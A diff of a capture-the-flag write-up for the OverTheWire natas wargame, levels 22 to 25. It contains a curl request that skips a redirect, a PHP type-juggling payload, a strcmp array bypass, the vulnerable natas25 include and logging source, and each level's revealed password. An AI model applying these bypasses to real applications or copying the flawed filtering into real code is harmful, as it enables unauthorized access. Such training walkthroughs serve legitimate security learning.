@@ -1521,7 +1521,7 @@ Custom input form to `<input name="admin" value="1">` -> POST -> get response wi
 Array ( [align] => center [fontsize] => 100% [bgcolor] => yellow [admin] => 1 [submit] => Update )
 ```
 
-Oh, `[admin] => 1` is should be ok, let see the response:
+Oh, `[admin] => 1` is should be ok, let's see the response:
 
 ```
 GET /index.php?debug HTTP/1.1
@@ -1569,5 +1569,155 @@ if(array_key_exists("revelio", $_GET)) {
     print "Password: <censored></pre>";
     }
 ?> 
+```
+
+In the browser, try access: http://natas22.natas.labs.overthewire.org/?revelio to get password. But it's nothing???
+
+Because `header("Location: /");` in source code, the browser redirect to root page (/), Let's use `curl`:
+
+```sh
+curl --user natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ http://natas22.natas.labs.overthewire.org/?revelio
+```
+
+```
+You are an admin. The credentials for the next level are:<br><pre>Username: natas23
+Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+```
+
+### natas23
+
+```php
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas24 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>  
+```
+
+In PHP, we can compare between string and int, string will be convert to int, such as: `"abc"->0`, `"123abc->123` or `"10e1xyz"->100`. So the passwd payload `123iloveyou` is should be ok.
+
+```
+The credentials for the next level are:
+
+Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+```
+
+### natas24
+
+```php
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(!strcmp($_REQUEST["passwd"],"<censored>")){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas25 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?> 
+```
+
+In PHP, `strcmp` is used to compare two string. If two string equal, the `strcmp` return to 0.
+
+We want `strcmp` return to 0. It will happen if passwd will be a string equals to which is unknown. The other case is that passwd won't be a string, the function will return `NULL` (equal 0) and raise Warning, such as below:
+
+```
+strcmp("foo", array()) => NULL + PHP Warning
+strcmp("foo", new stdClass) => NULL + PHP Warning
+strcmp(function(){}, "") => NULL + PHP Warning
+```
+
+Let's pass `passwd` as array with the payload `?passwd[]=`:
+
+```
+Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23
+
+The credentials for the next level are:
+
+Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
+```
+
+```php
+<?php
+    // cheers and <3 to malvina
+    // - morla
+
+    function setLanguage(){
+        /* language setup */
+        if(array_key_exists("lang",$_REQUEST))
+            if(safeinclude("language/" . $_REQUEST["lang"] ))
+                return 1;
+        safeinclude("language/en"); 
+    }
+    
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) { 
+            include($filename);
+            return 1;
+        }
+        return 0;
+    }
+    
+    function listFiles($path){
+        $listoffiles=array();
+        if ($handle = opendir($path))
+            while (false !== ($file = readdir($handle)))
+                if ($file != "." && $file != "..")
+                    $listoffiles[]=$file;
+        
+        closedir($handle);
+        return $listoffiles;
+    } 
+    
+    function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n"; 
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+?>
+
+<h1>natas25</h1>
+<div id="content">
+<div align="right">
+<form>
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
+</select>
+</form>
+</div>
+
+<?php  
+    session_start();
+    setLanguage();
+    
+    echo "<h2>$__GREETING</h2>";
+    echo "<p align=\"justify\">$__MSG";
+    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
+?>
 ```
 
